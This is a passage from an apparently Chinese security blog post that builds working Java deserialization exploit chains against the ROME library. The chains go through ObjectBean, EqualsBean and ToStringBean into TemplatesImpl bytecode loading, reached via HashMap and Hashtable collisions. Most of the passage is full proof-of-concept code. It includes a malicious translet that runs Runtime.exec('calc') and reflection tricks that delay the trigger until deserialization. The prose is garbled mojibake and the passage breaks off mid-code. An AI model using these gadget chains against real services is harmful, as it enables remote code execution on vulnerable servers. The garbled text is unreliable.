com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import java.lang.reflect.Field; import java.nio.file.Files; import java.nio.file.Paths; import java.util.HashMap; import javax.xml.transform.Templates; import com.sun.syndication.feed.impl.ObjectBean; import java.io.FileOutputStream; import java.io.FileInputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; public class Main{ public static void main(String[] args) throws Exception { byte[] code = Files.readAllBytes(Paths.get(\u0026#34;D:\\\\maven_text\\\\maven1_text\\\\target\\\\test-classes\\\\org\\\\example\\\\Test.class\u0026#34;)); TemplatesImpl impl = new TemplatesImpl(); setFieldValue(impl,\u0026#34;_name\u0026#34;,\u0026#34;fupanc\u0026#34;); setFieldValue(impl,\u0026#34;_bytecodes\u0026#34;,new byte[][]{code}); setFieldValue(impl, \u0026#34;_class\u0026#34;, null); setFieldValue(impl, \u0026#34;_tfactory\u0026#34;, new TransformerFactoryImpl()); ObjectBean bean = new ObjectBean(Templates.class,impl); HashMap hashMap = new HashMap(); ObjectBean x = new ObjectBean(ObjectBean.class,bean); hashMap.put(x,\u0026#34;fupanc\u0026#34;); ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.ser\u0026#34;)); out.writeObject(hashMap); out.close(); ObjectInputStream input = new ObjectInputStream(new FileInputStream(\u0026#34;ser.ser\u0026#34;)); input.readObject(); input.close(); } public static void setFieldValue(Object obj,String fieldName,Object value) throws Exception{ Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj,value); } } æˆåŠŸæŒ‰ç…§é¢„æœŸå¼¹å‡ºä¸¤ä¸ªè®¡ç®—æœºã€‚ï¼ˆåºåˆ—ä¸€ä¸ªï¼Œååºåˆ—åŒ–ä¸€ä¸ªï¼‰\nä½†æ˜¯å¥½åƒè¿˜æ˜¯æœ‰ç‚¹é—®é¢˜ï¼Œæ„æ€ä¸€ä¸‹ï¼Œå¦‚ä½•åœ¨ååºåˆ—åŒ–çš„æ—¶å€™åªå¼¹å‡ºä¸€ä¸ªè®¡ç®—æœºï¼š\næ­£å¸¸æ¥è¯´è‚¯å®šä¼šåœ¨åºåˆ—åŒ–å‰çš„é‚£ä¸ªput()æ–¹æ³•ä¼šè°ƒç”¨ä¸€æ¬¡å®Œæ•´çš„é“¾ï¼Œé‚£é‡Œä¼šå¯¼è‡´å¼‚å¸¸è¾“å‡ºï¼Œæ‰€ä»¥å¹¶ä¸èƒ½æˆåŠŸåˆ©ç”¨ã€‚\nç°åœ¨æ¥çœ‹çœ‹åœ¨toString()æ–¹æ³•è·å–getterå¹¶è°ƒç”¨çš„ä»£ç ï¼š\næˆ‘æƒ³åˆ°äº†ä¸€ä¸ªç‚¹ï¼Œæ˜¯å¦å¯ä»¥è®©è¿™é‡Œçš„pdsä¸ºnullï¼Œä»è€Œåœ¨åºåˆ—åŒ–å‰ä¸è¿›å…¥ifæ¡ä»¶ä»è€Œä¸ä¼šè°ƒç”¨åˆ°getteræ–¹æ³•ï¼Œåœ¨putæ–¹æ³•è¿‡åå†åå°„ä¿®æ”¹å€¼å‘¢ï¼Ÿ\né‚£ä¹ˆè¿™ä¸ªpdså˜é‡çš„èµ‹å€¼ä¹Ÿæ˜¯åˆ†æè¿‡çš„ï¼Œæ‰€ä»¥å¯ä»¥å°è¯•æ‰¾æ²¡æœ‰getterå’Œsetteræ–¹æ³•çš„classå¯¹è±¡ï¼Ÿ\nä¸»è¦æ˜¯è¦æ»¡è¶³å¦‚ä¸‹æ¡ä»¶ï¼š\nä¹Ÿå°±æ˜¯è¿™ä¸ªEqualsBeanç±»å®ä¾‹åŒ–æ—¶å¿…é¡»æ»¡è¶³ç›¸å¯¹åº”çš„å®ä¾‹ã€‚æ‰¾äº†ä¸€ä¸‹æ²¡æ‰¾åˆ°ã€‚\nå…¶å®å…·ä½“çš„æ–¹æ³•å¯ä»¥å‚è€ƒåé¢çš„equals()æ–¹æ³•é“¾çš„è§£å†³æ–¹æ³•ï¼Œå…·ä½“æƒ³æ³•å¯ä»¥å…ˆçœ‹åé¢ï¼Œè¿™é‡Œå°±ç»™ä¸€ä¸ªPOCåå†ç®€å•è¯´æ˜ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 package org.example; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.syndication.feed.impl.ToStringBean; import com.sun.syndication.feed.impl.EqualsBean; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import java.lang.reflect.Field; import java.nio.file.Files; import java.nio.file.Paths; import java.util.HashMap; import javax.xml.transform.Templates; import java.io.FileOutputStream; import java.io.FileInputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; public class Main{ public static void main(String[] args) throws Exception { byte[] code = Files.readAllBytes(Paths.get(\u0026#34;D:\\\\maven_text\\\\maven1_text\\\\target\\\\test-classes\\\\org\\\\example\\\\Test.class\u0026#34;)); TemplatesImpl impl = new TemplatesImpl(); setFieldValue(impl,\u0026#34;_name\u0026#34;,\u0026#34;fupanc\u0026#34;); setFieldValue(impl,\u0026#34;_bytecodes\u0026#34;,new byte[][]{code}); setFieldValue(impl, \u0026#34;_class\u0026#34;, null); setFieldValue(impl, \u0026#34;_tfactory\u0026#34;, new TransformerFactoryImpl()); ToStringBean bean = new ToStringBean(Templates.class,impl); EqualsBean x = new EqualsBean(String.class,\u0026#34;fupanc\u0026#34;); HashMap hashMap = new HashMap(); hashMap.put(x,\u0026#34;fupanc\u0026#34;); setFieldValue(x,\u0026#34;_beanClass\u0026#34;,ToStringBean.class); setFieldValue(x,\u0026#34;_obj\u0026#34;,bean); ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.ser\u0026#34;)); out.writeObject(hashMap); out.close(); ObjectInputStream input = new ObjectInputStream(new FileInputStream(\u0026#34;ser.ser\u0026#34;)); input.readObject(); input.close(); } public static void setFieldValue(Object obj,String fieldName,Object value) throws Exception{ Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj,value); } } ç®€å•è¯´æ˜ä¸€ä¸‹ï¼Œè¿™é‡Œå°†ObjectBeanç±»éƒ½æ¢æˆäº†ç›¸å¯¹åº”çš„ç±»ï¼Œå¹¶ä¸”å…¶å®è¿™é‡Œæœ€ç»ˆè°ƒç”¨çš„éƒ½æ˜¯ç›¸å¯¹åº”çš„ç±»ï¼š\nå¯¹äºè¿™é‡Œçš„hashCode()ï¼Œå…¶å®è°ƒç”¨çš„å°±æ˜¯EqualsBeanç±»çš„beanHashCode()æ–¹æ³•ï¼š\nä¹Ÿå°±æ˜¯æ¼æ´è§¦å‘ç‚¹ï¼š\nåœ¨è¿™é‡Œï¼Œæˆ‘æ˜¯å°†EqualsBeanèµ‹å€¼æ—¶ä¹Ÿæ˜¯ç›¸å¯¹åº”çš„String.classå’Œ\u0026quot;fupanc\u0026quot;ï¼Œç¬¦åˆEqualsBeanç±»çš„æ„é€ å‡½æ•°æ–¹æ³•ï¼Œä¸»è¦çš„ä¸åŒç‚¹å°±æ˜¯ä¸Šé¢çš„beanHashCode()æ–¹æ³•ï¼ŒåŸå…ˆçš„POCä¸­æ˜¯ä¼šç›´æ¥è°ƒç”¨åˆ°toString()æ–¹æ³•è§¦å‘ä¸€æ¬¡è°ƒç”¨é“¾çš„ï¼Œä½†æ˜¯åœ¨è¿™é‡Œï¼Œæˆ‘å°†è¿™ä¸ª_objå˜é‡èµ‹å€¼ä¸ºäº†ä¸€ä¸ªå­—ç¬¦ä¸²å®ä¾‹ï¼Œæ‰€ä»¥è¿™é‡Œå°±æ˜¯ä¸€ä¸ªå•çº¯çš„ç®—hashçš„è¿‡ç¨‹ï¼š\né‚£ä¹ˆåç»­å°±æ˜¯æˆåŠŸå¾€hashMapä¸­æ”¾è¿›äº†é”®å€¼å¯¹ï¼Œç„¶ååœ¨ååºåˆ—åŒ–æ—¶ä¹Ÿæ˜¯ç¬¦åˆé¢„æœŸçš„ï¼š\nå¹¶ä¸”è¿è¡Œååªåœ¨ååºåˆ—åŒ–æ—¶å¼¹å‡ºä¸€ä¸ªè®¡ç®—æœºï¼ŒæˆåŠŸä¿®æ”¹ã€‚\nç­‰å¦‚HashSetã€HashtableåŸºæœ¬éƒ½å·®ä¸å¤šï¼Œå¦‚æœè¿‡æ»¤HashMapæ—¶è¦æƒ³åˆ°è¿™äº›ã€‚\nequals() è¿˜æ˜¯å…ˆæ¥ç»™å‡ºåŸºæœ¬ç›˜ï¼š Test.java:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 package org.example; import java.io.IOException; import com.sun.org.apache.xalan.internal.xsltc.DOM; import com.sun.org.apache.xalan.internal.xsltc.TransletException; import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet; import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator; import com.sun.org.apache.xml.internal.serializer.SerializationHandler; public class Test extends AbstractTranslet { public Test() throws IOException { Runtime.getRuntime().exec(\u0026#34;calc\u0026#34;); } @Override public void transform(DOM document, SerializationHandler[] handlers) throws TransletException { } @Override public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException { } } Main.javaï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 package org.example; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import java.lang.reflect.Field; import java.nio.file.Files; import java.nio.file.Paths; public class Main{ public static void main(String[] args) throws Exception { byte[] code = Files.readAllBytes(Paths.get(\u0026#34;D:\\\\maven_text\\\\maven1_text\\\\target\\\\test-classes\\\\org\\\\example\\\\Test.class\u0026#34;)); TemplatesImpl impl = new TemplatesImpl(); setFieldValue(impl,\u0026#34;_name\u0026#34;,\u0026#34;fupanc\u0026#34;); setFieldValue(impl,\u0026#34;_bytecodes\u0026#34;,new byte[][]{code}); setFieldValue(impl, \u0026#34;_class\u0026#34;, null); setFieldValue(impl, \u0026#34;_tfactory\u0026#34;, new TransformerFactoryImpl()); } public static void setFieldValue(Object obj,String fieldName,Object value) throws Exception{ Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj,value); } } ç°åœ¨è¿˜æ˜¯æ¥æƒ³å¦‚ä½•å°†åŸºæœ¬ç›˜æ¥å…¥Hashtableç±»ã€‚\né‡ç‚¹è¿˜æ˜¯åœ¨äºreadObject()è°ƒç”¨çš„reconstitutionPut()ï¼š ä¸‹é¢æ¥åˆ†æä¸€ä¸‹ã€‚\nå…ˆä»åºåˆ—åŒ–è¿‡ç¨‹è¯´èµ·ã€‚å†æ€»ç»“ä¸€ä¸‹å‰é¢çš„éœ€æ±‚ï¼š 1.é¦–å…ˆå°±æ˜¯è°ƒç”¨åˆ°çš„ObjectBeançš„equals()æ–¹æ³•ï¼Œç°åœ¨ç€é‡çœ‹å‚æ•°ï¼š è¿™é‡Œä¼ å…¥çš„otherå‚æ•°ï¼Œç»§ç»­çœ‹beanEquals()æ–¹æ³•ï¼š ä¹Ÿå°±æ˜¯è¿™é‡Œçš„objï¼Œå•çº¯å¯¹objæ¥è¯´å°±è¿™å‰é¢çš„åˆ©ç”¨ï¼Œç”±äºæˆ‘ä»¬æƒ³è¦æ­£å¸¸åˆ©ç”¨åé¢çš„invoke()æ–¹æ³•ï¼Œæ‰€ä»¥éœ€è¦æ»¡è¶³this._beanClass.isInstance(obj)ï¼Œè¿™æ ·æ‰ä¼šè¿›å…¥elseæ‰§è¡Œæˆ‘ä»¬æƒ³ç”¨çš„ä»£ç ã€‚åœ¨è¿™é‡Œæˆ‘ä¼šå°è¯•ä¼ å…¥ä¸€ä¸ªTemplatesImplå®ä¾‹ï¼Œä½†æ˜¯çœŸæ­£åˆ©ç”¨çš„å´å¹¶ä¸æ˜¯è¿™ä¸ªä¼ å…¥çš„TemplatesImplç±»å®ä¾‹ï¼Œçœ‹åˆ©ç”¨ä»£ç ï¼š\nä¹Ÿæ˜¯ä¹‹å‰ä¸€ç›´è¯´çš„ï¼ŒåŠ¨æ€åŠ è½½å­—èŠ‚ç åä¼šç›´æ¥æŠ¥å¼‚å¸¸ç„¶åé€€å‡ºï¼Œæ‰€ä»¥è¿™é‡ŒçœŸæ­£åˆ©ç”¨åˆ°çš„å…¶å®åªæ˜¯è¿™ä¸ªbean1ï¼Œè€Œè¿™ä¸ªbean1å¯¹åº”çš„æ˜¯_objè¿™ä¸ªå˜é‡ï¼Œé‚£ä¸ªè¿™é‡Œçš„bean1ï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬æ„é€ çš„å‚æ•°ä¼ é€’çš„å€¼ï¼Œèµ·çš„çœŸæ­£ä½œç”¨æ˜¯ä»€ä¹ˆï¼Œå°±æ˜¯ä¸ºäº†æ»¡è¶³this._beanClass.isInstance(obj)ï¼Œä¹Ÿå°±åªæœ‰è¿™ä¸ªä½œç”¨äº†ï¼Œå…·ä½“å‚æ•°ä¼ é€’åé¢ä¼šè®²ï¼Œä½œç”¨ä¹Ÿå°±æ˜¯è¿™ä¸ªã€‚\n2.ç°åœ¨å†æ¥çœ‹ä¸€ä¸‹Hashtableçš„putæ–¹æ³•ï¼š\nå¦‚ä½•è§¦å‘equals()æ–¹æ³•ï¼Œè‡ªå·±æƒ³äº†ä¸€ä¸‹ï¼Œæœ¬æ¥æƒ³ç›´æ¥ä¼ å…¥ObjectBeanç±»å®ä¾‹çš„ï¼Œä½†æ˜¯å¯¹äºè¿™é‡Œçš„hashç›¸ç­‰ä¸ä¸€å®šã€‚\nçœ‹äº†ä¸€ä¸‹niviaå¸ˆå‚…çš„æ–‡ç« ï¼Œè°ƒç”¨çš„æ˜¯HashMapçš„equals()æ–¹æ³•ï¼Œè¿™ä¸ªequals()æ–¹æ³•è°ƒç”¨è¿‡ç¨‹æ˜¯å’ŒCC7çš„é‚£æ¡é“¾å·®ä¸å¤šçš„ã€‚\nç°åœ¨å†æ¥çœ‹ä¸€ä¸‹HashMapçš„equals()è°ƒç”¨è¿‡ç¨‹ï¼š\nHashMapçˆ¶ç±»AbstractMapçš„equals()æ–¹æ³•ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 public boolean equals(Object o) { if (o == this) return true; if (!(o instanceof Map)) return false; Map\u0026lt;?,?\u0026gt; m = (Map\u0026lt;?,?\u0026gt;) o; if (m.size() != size()) return false; try { Iterator\u0026lt;Entry\u0026lt;K,V\u0026gt;\u0026gt; i = entrySet().iterator(); while (i.hasNext()) { Entry\u0026lt;K,V\u0026gt; e = i.next(); K key = e.getKey(); V value = e.getValue(); if (value == null) { if (!(m.get(key)==null \u0026amp;\u0026amp; m.containsKey(key))) return false; } else { if (!value.equals(m.get(key))) return false; } } } catch (ClassCastException unused) { return false; } catch (NullPointerException unused) { return false; } return true; } åœ¨è¿™ä¸ªæ–¹æ³•ä»£ç é‡Œé¢è¿˜æœ‰ä¸€å¤„æ˜¯è°ƒç”¨çš„equals\nå°±æ˜¯è¿™é‡Œï¼Œåªè¦æ§åˆ¶è¿™é‡Œçš„valueä¸ºObjectBeanç±»å®ä¾‹å³å¯ã€‚\nç»“åˆå‰é¢çš„éœ€æ±‚ï¼Œæˆ‘ä»¬éœ€è¦ä¼ å…¥ä¸¤ä¸ªï¼Œä¸€ä¸ªæ˜¯HashMapç±»å®ä¾‹ï¼Œè¿˜æœ‰ä¸ªå°±æ˜¯TemplatesImplç±»å®ä¾‹ï¼Œä½†æ˜¯çœ‹è¿™é‡Œå‚æ•°çš„ä¼ é€’ï¼Œå…¶å®å°±æ˜¯m.get(key)å¾—åˆ°çš„å€¼å°±æ˜¯å¯¹åº”å‰é¢è¯´è¿‡çš„ObjectBeanç±»çš„equals()æ–¹æ³•çš„otherï¼Œç„¶åè¿™é‡Œçš„måˆæ˜¯å¯¹åº”çš„ä¼ å…¥çš„oï¼š\nå³ï¼š è¿™é‡Œçš„keyã€‚\næ‰€ä»¥ç°åœ¨æˆ‘ä»¬æ˜¯éœ€è¦ä¼ å…¥ä¸¤ä¸ªHashMapç±»å®ä¾‹ï¼Œç„¶åè¿™é‡Œå¯¹ç¬¬äºŒä¸ªHashMapç±»è°ƒç”¨getæ—¶å¯ä»¥è¿”å›ä¸€ä¸ªTemplatesImplç±»å®ä¾‹ã€‚æ‰€ä»¥æˆ‘ä»¬éœ€è¦putè¿›å»ã€‚\nè¿™é‡Œæ€»ç»“ä¸€ä¸‹å‰é¢çš„éœ€æ±‚ï¼š\nvalueèµ‹å€¼ä¸ºObjectBeanç±»å®ä¾‹\nä¼ å…¥ä¸¤ä¸ªHashMapç±»å®ä¾‹å¹¶ä¸”éœ€è¦æœ‰TemplatesImplç±»å®ä¾‹çš„å€¼ã€‚\né—®é¢˜è§£å†³ï¼š\nvalueçš„èµ‹å€¼é—®é¢˜ï¼š å°±æ˜¯è¿™ä¸ªï¼Œæ‰€ä»¥æˆ‘ä»¬è¿˜éœ€è¦ç»™HashMapä¼ è¿›å»ä¸€ä¸ªObjectBeanç±»å®ä¾‹çš„å€¼ã€‚åŒæ—¶åœ¨CC7å­¦ä¹ ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥çŸ¥é“è¿™é‡Œçš„eæ˜¯hashMap0ï¼ˆå‡è®¾ä¼šå‘Hashtableä¸­ä¼ å…¥hashMap0å’ŒhashMap1ï¼‰ï¼Œè¿™ä¹Ÿæ˜¯ä¸ºä»€ä¹ˆåœ¨CC7é‚£é‡Œè¦ç§»é™¤yyçš„åŸå› ã€‚\næ ¹æ®è¿™ä¸ªï¼Œæˆ‘ä»¬çš„ä¸¤ä¸ªHashMapç±»å°±éœ€è¦æœ‰é€»è¾‘ã€‚ç›´æ¥ç»™ä»£ç ï¼š\n1 2 3 4 5 6 7 HashMap hashMap0 = new HashMap(); hashMap0.put(\u0026#34;zZ\u0026#34;,bean); hashMap0.put(\u0026#34;yy\u0026#34;,impl); HashMap hashMap1 = new HashMap(); hashMap1.put(\u0026#34;zZ\u0026#34;,impl); hashMap1.put(\u0026#34;yy\u0026#34;,bean); æ¯”å¦‚è¯´å½“å‰é¢æ‹¿åˆ°çš„ç¬¬ä¸€ä¸ªHashMapçš„keyå’Œvalueåˆ†åˆ«ä¸ºzZå’Œbeanï¼Œé‚£ä¹ˆæ­¤æ—¶å¯¹äºæˆ‘ä»¬çš„ç¬¬äºŒä¸ªHashMapè°ƒç”¨çš„å°±æ˜¯get(\u0026ldquo;zZ\u0026rdquo;)ï¼Œè€Œæˆ‘ä»¬è¿™é‡Œéœ€è¦çš„æ˜¯implï¼Œæ‰€ä»¥åœ¨ç¬¬äºŒä¸ªHashMapçš„é”®å€¼å¯¹ä¸­æˆ‘ä»¬å°±éœ€è¦å°†é”®zZçš„å€¼è®¾ç½®ä¸ºimplï¼Œæ‰€ä»¥è¿™é‡Œä¹Ÿæ˜¯éœ€è¦åç€æ¥çš„åŸå› ã€‚\né‚£ä¹ˆåˆæ˜¯ä¸ºä»€ä¹ˆè¦ä¸¤ä¸ªå‘¢ï¼Ÿ\næŒ‰ç†è¯´åº”è¯¥å¦‚ä¸‹ä»£ç å°±è¡Œäº†ï¼š\n1 2 3 4 5 HashMap hashMap0 = new HashMap(); hashMap0.put(\u0026#34;zZ\u0026#34;,bean); HashMap hashMap1 = new HashMap(); hashMap1.put(\u0026#34;zZ\u0026#34;,impl); è¿™æ ·ä¸å°±å·²ç»å¯¹åº”äº†å—ã€‚è¿™å°±ä¸hashå€¼ç›¸ç­‰æœ‰å…³ç³»äº†ï¼Œç»§ç»­çœ‹åé¢ã€‚\nhashå€¼ç›¸åŒçš„é—®é¢˜ï¼š åœ¨å‰é¢ä¹Ÿè¯´è¿‡äº†ï¼Œä¼šä¼ å…¥ä¸¤ä¸ªHashMapç±»ï¼Œæ‰€ä»¥ä¼šè°ƒç”¨HashMapçš„çˆ¶ç±»AbstractMapçš„hashCode()æ–¹æ³•ï¼Œåœ¨CC7ä¹Ÿæœ‰è¯´è¿‡ï¼Œè¿‡ç¨‹ä¸­éœ€è¦æ³¨æ„çš„ç‚¹å°±æ˜¯ï¼š å³åœ¨ç”Ÿæˆå“ˆå¸Œç çš„æ—¶å€™éœ€è¦è€ƒè™‘åˆ°keyå’Œvalueã€‚\næ¯‹åº¸ç½®ç–‘yyå’ŒzZæœ¬èº«å°±å·²ç»å“ˆå¸Œç¢°æ’ç›¸åŒäº†ã€‚åœ¨æˆ‘ä»¬ä¹‹å‰çš„æå‡ºçš„ç–‘é—®ï¼šä¸ºå•¥è®¾ç½®ä¸¤ä¸ªï¼Œè¿™é‡Œå°±èƒ½ç»™å‡ºç­”æ¡ˆï¼šåƒå‰é¢é‚£æ ·åªè®¾ç½®ä¸€ä¸ªï¼Œkeyæ˜¯ç›¸åŒäº†ï¼Œä½†æ˜¯è¿™é‡Œçš„valueæ˜¯è‚¯å®šä¸ç›¸åŒçš„ã€‚\næ‰€ä»¥æˆ‘ä»¬éœ€è¦è®¾ç½®ä¸¤ä¸ªï¼š\n1 2 3 4 5 6 7 HashMap hashMap0 = new HashMap(); hashMap0.put(\u0026#34;zZ\u0026#34;,bean); hashMap0.put(\u0026#34;yy\u0026#34;,impl); HashMap hashMap1 = new HashMap(); hashMap1.put(\u0026#34;zZ\u0026#34;,impl); hashMap1.put(\u0026#34;yy\u0026#34;,bean); â€”â€”â€”â€”â€”â€”\nç°åœ¨å°±å¯ä»¥å°è¯•ä¸€ä¸‹æ„é€ ä»£ç äº†ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 package org.example; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import java.lang.reflect.Field; import java.nio.file.Files; import java.nio.file.Paths; import javax.xml.transform.Templates; import java.util.Hashtable; import com.sun.syndication.feed.impl.ObjectBean; import java.util.HashMap; import java.io.FileOutputStream; import java.io.FileInputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; public class Main{ public static void main(String[] args) throws Exception { byte[] code = Files.readAllBytes(Paths.get(\u0026#34;D:\\\\maven_text\\\\maven1_text\\\\target\\\\test-classes\\\\org\\\\example\\\\Test.class\u0026#34;)); TemplatesImpl impl = new TemplatesImpl(); setFieldValue(impl,\u0026#34;_name\u0026#34;,\u0026#34;fupanc\u0026#34;); setFieldValue(impl,\u0026#34;_bytecodes\u0026#34;,new byte[][]{code}); setFieldValue(impl, \u0026#34;_class\u0026#34;, null); setFieldValue(impl, \u0026#34;_tfactory\u0026#34;, new TransformerFactoryImpl()); ObjectBean bean = new ObjectBean(Templates.class,impl); Hashtable hash = new Hashtable(); HashMap hashMap0 = new HashMap(); hashMap0.put(\u0026#34;zZ\u0026#34;,bean); hashMap0.put(\u0026#34;yy\u0026#34;,impl); HashMap hashMap1 = new HashMap(); hashMap1.put(\u0026#34;zZ\u0026#34;,impl); hashMap1.put(\u0026#34;yy\u0026#34;,bean); hash.put(hashMap0,1); hash.put(hashMap1,1); ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.ser\u0026#34;)); out.writeObject(hash); out.close(); ObjectInputStream input = new ObjectInputStream(new FileInputStream(\u0026#34;ser.ser\u0026#34;)); input.readObject(); input.close(); } public static void setFieldValue(Object obj,String fieldName,Object value) throws Exception{ Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj,value); } } è¿è¡Œååªå¼¹å‡ºä¸€ä¸ªè®¡ç®—æœºï¼Œé‚£ä¹ˆåªèƒ½æ˜¯åºåˆ—åŒ–çš„æ—¶å€™å¼¹å‡ºæ¥çš„ï¼Œæ‰“æ–­ç‚¹è°ƒè¯•ä¸€ä¸‹ï¼Œå‘ç°ç¡®å®æ˜¯éƒ½æ²¡æœ‰è¿›å…¥åºåˆ—åŒ–éƒ¨åˆ†ï¼Œå¹¶ä¸”æ˜¯æ— æ³•æ”¾å…¥ç¬¬äºŒä¸ªé”®å€¼å¯¹çš„ï¼š\nè§£å†³æ–¹æ³•ï¼Œè¿˜æ˜¯åå°„æ›´æ”¹ï¼Œä»£ç å¦‚ä¸‹ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 package org.example; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import java.lang.reflect.Field; import java.nio.file.Files; import java.nio.file.Paths; import javax.xml.transform.Templates; import java.util.Hashtable; import com.sun.syndication.feed.impl.ObjectBean; import java.util.HashMap; import com.sun.syndication.feed.impl.EqualsBean; import java.io.FileOutputStream; import java.io.FileInputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; public class Main{ public static void main(String[] args) throws Exception { byte[] code = Files.readAllBytes(Paths.get(\u0026#34;D:\\\\maven_text\\\\maven1_text\\\\target\\\\test-classes\\\\org\\\\example\\\\Test.class\u0026#34;)); TemplatesImpl impl = new TemplatesImpl(); setFieldValue(impl,\u0026#34;_name\u0026#34;,\u0026#34;fupanc\u0026#34;); setFieldValue(impl,\u0026#34;_bytecodes\u0026#34;,new byte[][]{code}); setFieldValue(impl, \u0026#34;_class\u0026#34;, null); setFieldValue(impl, \u0026#34;_tfactory\u0026#34;, new TransformerFactoryImpl()); EqualsBean bean = new EqualsBean(String.class,\u0026#34;fupanc\u0026#34;); Hashtable hash = new Hashtable(); HashMap hashMap0 = new HashMap(); hashMap0.put(\u0026#34;zZ\u0026#34;,bean); hashMap0.put(\u0026#34;yy\u0026#34;,impl); HashMap hashMap1 = new HashMap(); hashMap1.put(\u0026#34;zZ\u0026#34;,impl); hashMap1.put(\u0026#34;yy\u0026#34;,bean); hash.put(hashMap0,1); hash.put(hashMap1,1); setFieldValue(bean,\u0026#34;_beanClass\u0026#34;,Templates.class); setFieldValue(bean,\u0026#34;_obj\u0026#34;,impl); ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.ser\u0026#34;)); out.writeObject(hash); out.close(); ObjectInputStream input = new ObjectInputStream(new FileInputStream(\u0026#34;ser.ser\u0026#34;)); input.readObject(); input.close(); } public static void setFieldValue(Object obj,String fieldName,Object value) throws Exception{ Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj,value); } } ç®€å•è¯´æ˜ä¸€ä¸‹ï¼ŒEqualsBeanç±»ä¸ç”¨è¯´äº†ï¼Œå°±æ˜¯ObjectBeanç±»å®ä¾‹ç”¨çš„é‚£ä¸ªã€‚ObjectBeanç±»çš„equals()æ–¹æ³•ä¹Ÿæ˜¯æŒ‡å‘çš„æˆ‘ä»¬è¦åˆ©ç”¨çš„é‚£ä¸ªï¼š å¯¹äºåå°„ä¿®æ”¹ï¼Œè¿˜æ˜¯å¾ˆå¦™çš„ï¼Œç›´æ¥åœ¨ä¸‹é¢è¿™ä¸€æ­¥å°±æ–­å‡ºå»äº†å¹¶ä¸”æ²¡æœ‰å½±å“åŸºæœ¬çš„èµ‹å€¼é—®é¢˜ï¼š å› ä¸ºä¼ å…¥çš„TemplatesImplç±»å®ä¾‹å’ŒString.classä¸æ˜¯ç›¸å¯¹åº”çš„ï¼Œæ‰€ä»¥æ²¡æœ‰è¿›å…¥ä¸‹é¢çš„åŠ è½½å­—èŠ‚ç çš„è¿‡ç¨‹ã€‚ç›´æ¥è®²eqèµ‹å€¼ä¸ºäº†falseï¼Œå¹¶ä¸”åœ¨æœ€åæ˜¯è¿”å›äº†è¿™ä¸ªå€¼çš„ï¼š\nä¹Ÿå°±æ˜¯è¯´è¿™é‡Œè°ƒç”¨equals()æ–¹æ³•åæœ€åè¿”å›çš„æ˜¯falseï¼ŒæˆåŠŸæ”¾å…¥äº†ç¬¬äºŒä¸ªé”®å€¼å¯¹ï¼Œä¸ä¼šè¦†ç›–ï¼š\néå¸¸å¦™ï¼ŒåŒæ—¶ä¼ å…¥fupancï¼Œæ˜¯ä¸ºäº†è®©equalsBeanèƒ½å¤ŸæˆåŠŸå®ä¾‹åŒ–ï¼š\næ‰€ä»¥æœ€ç»ˆPOCä¸ºï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 package org.example; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import java.lang.reflect.Field; import java.nio.file.Files; import java.nio.file.Paths; import javax.xml.transform.Templates; import java.util.Hashtable; import com.sun.syndication.feed.impl.ObjectBean; import java.util.HashMap; import com.sun.syndication.feed.impl.EqualsBean; import java.io.FileOutputStream; import java.io.FileInputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; public class Main{ public static void main(String[] args) throws Exception { byte[] code = Files.readAllBytes(Paths.get(\u0026#34;D:\\\\maven_text\\\\maven1_text\\\\target\\\\test-classes\\\\org\\\\example\\\\Test.class\u0026#34;)); TemplatesImpl impl = new TemplatesImpl(); 